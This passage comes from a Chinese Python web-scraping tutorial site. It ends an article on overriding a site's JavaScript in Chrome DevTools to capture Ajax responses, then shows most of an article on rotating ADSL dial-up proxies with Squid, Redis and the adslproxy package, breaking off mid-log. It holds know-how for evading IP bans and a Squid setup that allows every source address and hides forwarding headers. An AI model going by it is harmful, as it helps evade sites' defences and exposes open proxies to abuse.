                  <p>再切回 Overrides 面板，点击 + 按钮，这时候浏览器会提示我们选择一个本地文件夹，用于存储要替换的 JavaScript 文件。这里我选定了一个我任意新建的文件夹 ChromeOverrides，注意，这时候可能会遇到如图所示的提示，如果没有问题，直接点击“允许”即可。</p>
                  <p><img src="https://cdn.cuiqingcai.com/fbyji.png" alt="弹出提示"></p>
                  <p>这时，在 Overrides 面板下就多了一个 ChromeOverrides 文件夹，用于存储所有我们想要更改的 JavaScript 文件，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/bh127.png" alt="Overrides 面板下出现 ChromeOverrides 文件夹"></p>
                  <p>我们可以看到，现在所在的 JavaScript 选项卡是 <code>chunk-19c920f8.012555a2.js:formatted</code>，代码已经被格式化了。因为格式化后的代码是无法直接在浏览器中修改的，所以为了方便，我们可以将格式化后的文件复制到文本编辑器中，然后添加一行代码，修改如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">...</span><br><span class="line">&#125;).then((<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'response'</span>, a) <span class="comment">// 添加一行代码</span></span><br><span class="line">  <span class="keyword">var</span> e = a.data</span><br><span class="line">  	, s = e.results</span><br><span class="line">  	, n = e.count;</span><br><span class="line">  t.loading = !<span class="number">1</span>,</span><br><span class="line">...</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>接着把修改后的内容替换到原来的 JavaScript 文件中。这里要注意，切换到 <code>chunk-19c920f8.012555a2.js</code> 文件才能修改，直接替换 JavaScript 文件的所有内容即可，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/n987x.png" alt="替换 JavaScript 文件的所有内容"></p>
                  <p>替换完毕之后保存，这时候再切换回 Overrides 面板，就可以发现成功生成了新的 JavaScript 文件，它用于替换原有的 JavaScript 文件，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/jy0vc.png" alt="生成了新的 JavaScript 文件"></p>
                  <p>好，此时我们取消所有断点，然后刷新页面，就可以在控制台看到输出的 Reponse 结果了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/760yf.png" alt="Reponse 结果"></p>
                  <p>正如我们所料，我们成功将变量 <code>a</code> 输出，其中的 <code>data</code> 字段就是 Ajax 的 Response 结果，证明改写 JavaScript 成功！而且刷新页面也不会丢失了。</p>
                  <p>我们还可以增加一些 JavaScript 逻辑，比如直接将变量 <code>a</code> 的结果通过 API 发送到远程服务器，并通过服务器将数据保存下来，也就完成了直接拦截 Ajax 请求并保存数据的过程了。</p>
                  <p>修改 JavaScript 文件有很多用途，此方案可以为我们进行 JavaScript 的逆向带来极大的便利。</p>
                  <h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2>
                  <p>本节总结了一些浏览器开发者工具中对 JavaScript 逆向非常有帮助的功能，熟练掌握了这些功能会对后续 JavaScript 逆向分析打下坚实的基础，请大家好好研究。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-05 14:11:52" itemprop="dateCreated datePublished" datetime="2022-03-05T14:11:52+08:00">2022-03-05</time>
                </span>
                <span id="/2022112.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - JavaScript 逆向调试常用技巧" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022104.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022104.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - ADSL 拨号代理的使用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>我们在前面尝试维护过一个代理池，代理池可以挑选出许多可用代理，但是常常其稳定性不高、响应速度慢，而且这些代理通常是公共代理，可能不止一人同时使用，其 IP 被封的概率很大。另外，这些代理可能有效时间比较短，虽然代理池一直在筛选，但如果没有及时更新状态，也有可能获取到不可用的代理。</p>
                  <p>上一节我们也了解了付费代理的使用，付费代理的质量相对免费代理就会好不少，这的确已经是一个相对不错的方案了，但本节要介绍的方案可以使我们既能不断更换代理，又可以保证代理的稳定性。</p>
                  <p>在一些付费代理套餐中，大家可能会注意到有这样的一个套餐 - 独享代理或私密代理，这种其实就是用了专用服务器搭建了代理服务，相对一般的付费代理来说，其稳定性更好，速度也更快，同时 IP 可以动态变化。这种独享代理或私密代理的 IP 切换大多数都是基于 ADSL 拨号机制来实现的，一台云主机每拨号一次就可以换一个 IP，同时云主机上搭建了代理服务，我们就可以直接使用该云主机的 HTTP 代理来进行数据爬取了。</p>
                  <p>本节我们就来实际操作一下搭建 ADSL 拨号代理服务的方法。</p>
                  <h2 id="1-什么是-ADSL"><a href="#1-什么是-ADSL" class="headerlink" title="1. 什么是 ADSL"></a>1. 什么是 ADSL</h2>
                  <p>ADSL，英文全称是 Asymmetric Digital Subscriber Line，即非对称数字用户环路。它的上行和下行带宽不对称，它采用频分复用技术把普通的电话线分成了电话、上行和下行 3 个相对独立的信道，从而避免了相互之间的干扰。</p>
                  <p>ADSL 通过拨号的方式上网，拨号时需要输入 ADSL 账号和密码，每次拨号就更换一个 IP。IP 分布在多个 A 段，如果 IP 都能使用，则意味着 IP 量级可达千万。如果我们将 ADSL 主机作为代理，每隔一段时间云主机拨号就换一个 IP，这样可以有效防止 IP 被封禁。另外，由于我们是直接使用专有的云主机搭建的代理服务，所以其代理的稳定性相对更好，代理响应速度也相对更快。</p>
                  <h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2>
                  <p>在本节开始之前，我们需要先购买几台 ADSL 代理云主机，建议 2 台或以上。因为云主机在拨号的一瞬间服务器正在切换 IP，所以拨号之后代理是不可用的状态，所以需要 2 台及以上云主机来做负载均衡。</p>
                  <p>ADSL 代理云主机的服务商还是比较多的，个人推荐的有阿斯云、云立方等，其官网分别为：</p>
                  <ul>
                    <li>阿斯云：<a href="https://asiyun.cn/" target="_blank" rel="noopener">https://asiyun.cn/</a></li>
                    <li>云立方：<a href="https://www.yunlifang.cn/" target="_blank" rel="noopener">https://www.yunlifang.cn/</a></li>
                  </ul>
                  <p>本节案例中，我们以阿斯云为例，购买了一台电信型同时安装了 CentOS Linux 系统的云主机。</p>
                  <p>购买成功之后，我们可以在后台找到服务器的连接 IP、端口、用户名、密码，拨号所用的用户名和密码，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/x96x4.png" alt="image-20210711154649835"></p>
                  <p>然后找到远程管理面板 − 远程连接的用户名和密码，也就是 SSH 远程连接服务器的信息。比如我使用的 IP 和端口是 zhongweidx01.jsq.bz:30042，用户名是 root，命令行下输入如下内容：</p>
                  <figure class="highlight plain">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">ssh root@zhongweidx01.jsq.bz -p 30042</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输入连接密码，就可以连接上远程服务器了，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/otm60.png" alt="image-20210711122126383"></p>
                  <p>登录成功之后，我们便可以开始本节的正式内容了。</p>
                  <h2 id="3-测试拨号"><a href="#3-测试拨号" class="headerlink" title="3. 测试拨号"></a>3. 测试拨号</h2>
                  <p>云主机默认已经配置了拨号相关的信息，如宽带用户名和密码等，所以我们无需额外进行配置，只需要调用相应的拨号命令即可实现拨号和 IP 地址的切换。</p>
                  <p>我们可以输入如下拨号命令来进行拨号：</p>
                  <figure class="highlight plain">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pppoe-start</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>拨号命令成功运行，没有报错信息，耗时约几秒，结束之后整个主机就获得了一个有效的 IP 地址。</p>
                  <p>如果要停止拨号，可以输入如下命令：</p>
                  <figure class="highlight plain">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pppoe-stop</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完该命令后，网络就会断开，之前的 IP 地址也会被释放。</p>
                  <blockquote>
                    <p>注意：不同的云主机的拨号命令可能不同，如云立方主机的拨号命令为 <code>adsl-start</code> 和 <code>adsl-stop</code>，请以官方文档的说明为准。</p>
                  </blockquote>
                  <p>所以，如果要想切换 IP，我们只需要将上面的两个命令组合起来，先执行 <code>pppoe-stop</code>，再执行 <code>pppoe-start</code>。每次拨号，<code>ifconfig</code> 命令观察主机的 IP，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/tkgo8.png" alt="image-20210711123026267"></p>
                  <p>可以看到，这里我们执行了停止和开始拨号的命令之后，通过 <code>ifconfig</code> 命令获取的网卡信息的 IP 地址就变化了，所以我们成功实现了 IP 地址的切换。</p>
                  <p>好，那如果我们要想将这台云主机设置为可以实时变化 IP 的代理服务器的话，主要就有这几件事情：</p>
                  <ul>
                    <li>在云主机上运行代理服务软件，使之可以提供 HTTP 代理服务</li>
                    <li>实现云主机定时拨号更换 IP</li>
                    <li>实时获取云主机的代理 IP 和端口信息</li>
                  </ul>
                  <p>接下来我们就来完成这几部分内容吧。</p>
                  <h2 id="4-设置代理服务器"><a href="#4-设置代理服务器" class="headerlink" title="4. 设置代理服务器"></a>4. 设置代理服务器</h2>
                  <p>当前我们使用的云主机使用的是 Linux 的 CentOS 系统，目前它是无法作为一个 HTTP 代理服务器来使用的，因为该云主机上面目前并没有运行相关的代理软件。要想让该云主机提供 HTTP 代理服务，我们需要在其上面安装并运行相关的代理服务。</p>
                  <p>那什么软件能提供这种代理服务呢？目前业界比较流行的有 Squid 和 TinyProxy，配置完成之后它们会在特定端口上运行一个 HTTP 代理。知道了该云主机当前的 IP 之后，我们就能使用该云主机上 Squid 或 TinyProxy 提供的 HTTP 代理了。</p>
                  <p>这里我们以 Squid 为例来进行一下配置。</p>
                  <p>首先我们安装一下 Squid，在 CentOS 的安装命令如下：</p>
                  <figure class="highlight gml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo yum -<span class="symbol">y</span> update</span><br><span class="line">yum -<span class="symbol">y</span> install squid</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完之后，我们便可以成功安装好 Squid 了。</p>
                  <p>如果要想启动 Squid，可以运行如下命令：</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">systemctl <span class="literal">start</span> squid</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果想配置开机自动启动，可以运行如下命令：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">systemctl <span class="builtin-name">enable</span> squid</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Squid 成功运行之后，我们可以使用如下命令查看当前 Squid 的运行状态：</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">systemctl status squid</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如图所示，我们可以看到 Squid 就成功运行了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/76h1i.png" alt="image-20210711132337727"></p>
                  <p>默认情况下，Squid 会运行在 3128 端口，也就是相当于在云主机的 127.0.0.1:3128 上启动了代理服务，接下来我们可以来测试下 Squid 的代理效果，在该台云主机上运行 curl 命令请求 <a href="https://httpbin.org，并配置使用云主机的代理：">https://httpbin.org，并配置使用云主机的代理：</a></p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3128</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里 curl 的 -x 参数代表设置 HTTP 代理，由于这是在云主机上运行的，所以代理直接设置为了 <a href="http://127.0.0.1:3128。">http://127.0.0.1:3128。</a></p>
                  <p>运行完毕之后，我们再运行下 ifconfig 获取下当前云主机的 IP，运行结果如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/q9khx.png" alt="image-20210711133237708"></p>
                  <p>可以看到返回结果的 origin 字段的 IP 就和 ifconfig 获取的 IP 地址是一致的。</p>
                  <p>接下来，我们在自己本机上（非云主机）运行如下命令测试下代理的连通情况，这里 IP 就需要更换为云主机本身的 IP 了，刚才可以看到云主机当前拨号的 IP 是 106.45.104.166，所以需要运行如下命令：</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">106.45</span><span class="number">.104</span><span class="number">.166</span>:<span class="number">3128</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然而发现并没有对应的输出结果，代理连接失败。</p>
                  <p>其实原因在于默认情况下 Squid 并没有开启允许外网访问，我们可以进行 Squid 的相关配置，如更改当前代理运行端口、允许连接的 IP，配置高匿代理等等，这些都需要修改 <code>/etc/squid/squid.conf</code> 文件。</p>
                  <p>要允许公网访问，最简单的方案就是将 <code>/etc/squid/squid.conf</code> 中的该行：</p>
                  <figure class="highlight ada">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">http_access deny <span class="keyword">all</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改为：</p>
                  <figure class="highlight ada">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">http_access allow <span class="keyword">all</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>意思是允许来自所有 IP 的请求连接。</p>
                  <p>另外还需要在配置文件的开头 acl 配置的部分添加该行内容：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">acl all src <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>另外我们还想将 Squid 配置成高度匿名代理，这样目标网站就无从通过一些参数如 X-Forwarded-For 来得知爬虫机本身的 IP 了，所以在配置文件中再添加如下配置：</p>
                  <figure class="highlight ada">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">request_header_access Via deny <span class="keyword">all</span></span><br><span class="line">request_header_access X-Forwarded-<span class="keyword">For</span> deny <span class="keyword">all</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>另外有的云主机厂商可能默认封禁了 Squid 的 3128 端口，建议更换一个端口，比如 3328，修改改行：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">http_port <span class="number">3128</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改为：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">http_port <span class="number">3328</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改完配置之后保存配置文件，然后重新启动 Squid 即可：</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">systemctl restart squid</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时候在本机上（非云主机）重新运行刚才的 curl 命令，同时更改下端口：</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">106.45</span><span class="number">.104</span><span class="number">.166</span>:<span class="number">3328</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>即可得到返回结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"curl/7.64.1"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60ea8fc0-0701b1494e4680b95889cdb1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"106.45.104.166"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时候我们就可以在本机上直接使用云主机的代理了！</p>
                  <h2 id="5-动态获取-IP"><a href="#5-动态获取-IP" class="headerlink" title="5. 动态获取 IP"></a>5. 动态获取 IP</h2>
                  <p>现在我们已经可以执行命令让主机动态切换 IP 了，同时也在主机上搭建好代理服务器了，接下来我们只需要知道拨号后的 IP 就可以使用代理了。</p>
                  <p>那怎么动态获取拨号主机的 IP 呢？又怎么来维护这些代理呢？怎么保证获取到的代理一定是可用的呢？这时候我们可能想到一些问题：</p>
                  <ul>
                    <li>如果我们只有一台拨号云主机并设置了定时拨号的话，那么在拨号的几秒时间内，该云主机提供的代理服务是不可用的。</li>
                    <li>如果我们不用定时拨号的方法，而想要在爬虫端控制拨号云主机的拨号操作的话，爬虫端还需要单独的逻辑来处理拨号和重连的问题，这会带来额外的开销。</li>
                  </ul>
                  <p>综合考虑下来，一个比较好的解决方案是：</p>
                  <ul>
                    <li>为了不增加爬虫端的逻辑开销，爬虫端应该无需关心拨号云主机的拨号操作，我们只需要保证爬虫通过某个接口获取到的代理是可用的就行了，拨号云主机的代理的维护逻辑和爬虫是毫不相关的。</li>
                    <li>
                      <p>为了解决一台拨号云主机在拨号时代理不可用的问题，我们需要有多台云主机同时提供代理服务，我们可以将不同云主机的拨号时段错开，当一台云主机正在拨号时，我们可以用其他云主机顶替。</p>
                    </li>
                    <li>
                      <p>为了更加方便地维护和使用代理，我们可以像前文介绍的代理池一样把这些云主机的代理统一维护起来，所有拨号云主机的代理统一存储到一个公共的 Redis 数据库中，可以使用 Redis 的 Hash 存储方式，存好每台云主机和对应代理的映射关系。拨号云主机拨号前将自己对应的代理内容清空，拨号成功之后再将代理更新，这样 Redis 数据库中的代理就一定是实时可用的代理了。</p>
                    </li>
                  </ul>
                  <p>利用这种思路，我们要做的其实就有如下几点：</p>
                  <ul>
                    <li>配置一个可以公网访问的 Redis 数据库，每台云主机可以将自己的代理存储到对应的 Redis 数据库中，由该 Redis 数据库维护这些代理。</li>
                    <li>申请多台拨号云主机并按照上文所述配置好 Squid 代理服务，每台云主机设置定时拨号来更换 IP。</li>
                    <li>每台云主机在拨号前删除 Redis 数据库中原来的代理，拨号成功之后测试一下代理的可用性，将最新的代理更新到 Redis 数据库中即可。</li>
                  </ul>
                  <p>OK，接下来我们就来操作一下吧。</p>
                  <p>由于云主机要进行 Redis 数据库的操作，所以我们可以使用 Python 来实现，所以先在云主机上装下 Python：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yum -y <span class="keyword">install</span> python3</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>关于自动拨号、连接 Redis 数据库、获取本机代理、设置 Redis 数据库的操作，我已经写好了一个 Python 的包并发布到 PyPi 了，我们可以直接使用这个包来完成如上的功能，这个包叫做 adslproxy，可以在云主机上使用 pip3 来安装：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> adslproxy</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装完毕之后，我们可以使用 export 命令设置下环境变量：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_HOST</span>=&lt;Redis数据库的地址&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PORT</span>=&lt;Redis数据库的端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PASSWORD</span>=&lt;Redis数据库的密码&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PROXY_PORT</span>=&lt;拨号云主机配置的代理端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_BASH</span>=&lt;拨号脚本&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_IFNAME</span>=&lt;网卡名称&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLIENT_NAME</span>=&lt;云主机的唯一标识&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_CYCLE</span>=&lt;拨号间隔&gt;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里 REDIS_HOST、REDIS_PORT、REDIS_PASSWORD 就是远程 Redis 的连接信息，就不再赘述了。PROXY_PORT 就是云主机上代理服务的端口，我们已经设置为了 3328。DIAL_BASH 就是拨号的命令，即 <code>pppoe-stop;pppoe-start</code>，当然该脚本的内容不同的云主机厂商可能不同，以实际为准。DIAL_IFNAME 即拨号云主机上的网卡名称，程序可以通过获取该网卡的信息来获取当前拨号主机的 IP 地址，通过上述操作可以发现，网卡名称叫做 ppp0，当然这个名称也是以实际为准。CLIENT_NAME 就是云主机的唯一标识，用来在 Redis 中存储主机和代理的映射，因为我们有多台云主机，所以不同云主机的名称应该设置为不同的字符串，比如 adsl1、adsl2 等等。</p>
                  <p>这里我们设置如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/zfg87.png" alt="image-20210711152355780"></p>
                  <p>设置好环境变量之后，我们就可以运行 adslproxy 命令来进行拨号了，命令如下：</p>
                  <figure class="highlight autoit">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">adslproxy <span class="built_in">send</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">2021-07-11 15:30:03.062 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:loop:90 - Starting dial<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:30:03.063 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:99 - Dial started, <span class="builtin-name">remove</span> proxy</span><br><span class="line">2021-07-11 15:30:03.063 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:62 - Removing adsl1<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:30:04.065 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:69 - Removed adsl1 successfully</span><br><span class="line">2021-07-11 15:30:05.373 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:111 - <span class="builtin-name">Get</span> new<span class="built_in"> IP </span>106.45.105.33</span><br><span class="line">2021-07-11 15:30:15.552 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:120 - Valid<span class="built_in"> proxy </span>106.45.105.33:3328</span><br><span class="line">2021-07-11 15:30:16.501 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:set_proxy:82 - Successfully <span class="builtin-name">set</span><span class="built_in"> proxy </span>106.45.105.33:3328</span><br><span class="line">2021-07-11 15:33:36.678 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:loop:90 - Starting dial<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:33:36.679 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:99 - Dial started, <span class="builtin-name">remove</span> proxy</span><br><span class="line">2021-07-11 15:33:36.680 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:62 - Removing adsl1<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:33:37.214 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:69 - Removed adsl1 successfully</span><br><span class="line">2021-07-11 15:33:38.617 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:111 - <span class="builtin-name">Get</span> new<span class="built_in"> IP </span>106.45.105.219</span><br><span class="line">2021-07-11 15:33:48.750 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:120 - Valid<span class="built_in"> proxy 